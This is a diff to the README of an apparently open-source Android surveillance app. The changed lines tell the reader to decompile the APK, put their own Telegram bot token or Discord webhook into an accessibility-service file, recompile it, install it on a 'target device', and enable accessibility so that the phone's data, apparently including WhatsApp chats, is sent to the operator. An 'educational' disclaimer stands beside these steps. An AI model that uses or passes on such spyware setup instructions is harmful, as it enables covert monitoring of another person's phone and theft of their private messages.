@@ -33,17 +33,22 @@ This open-source project is intended for educational and research purposes only.
 1. __Telegram:__
     * Download APK file.
     * To decompile the APK, open it in an APK Editor like [APKToolGUI](https://github.com/AndnixSH/APKToolGUI) or [APK Editor Studio](https://github.com/kefir500/apk-editor-studio).
-    * Search for `TELEGRAM_BOT_TOKEN` and `TELEGRAM_CHAT_ID` and replace it with your correspondent bot token and chat ID
-    * Compile and sign apk.
-    * Install on target device.
+    * Open the decompilation folder and find the file named `MyAccessibilityService$MessageSender.smali`.
+    * Search for a file `TELEGRAM_BOT_TOKEN` and `TELEGRAM_CHAT_ID` and replace it with your correspondent bot token and chat ID.
+    * Compile and sign apk. 
+    * Install on target device. 
+    * You __must__ enable it in the accessibility settings.
 
 1. __Discord:__
     * Download APK file.
     * To decompile the APK, open it in an APK Editor like [APKToolGUI](https://github.com/AndnixSH/APKToolGUI) or [APK Editor Studio](https://github.com/kefir500/apk-editor-studio).
+    * Open the decompilation folder and find the file named `MyAccessibilityService$MessageSender.smali`.
     * Search for `DISCORD_WEBHOOK_URL` and replace it with your correspondent BOT URL you got it from Discord.
     * Compile and sign apk.
     * Install on target device.
+    * You __must__ enable it in the accessibility settings.
 
+If everything went ok, you should receive on discord or telegram chat a message containing some data of the cellphone that the app was installed on. 
 
 ## Images
 * Exemple of a whatsapp chat ↓
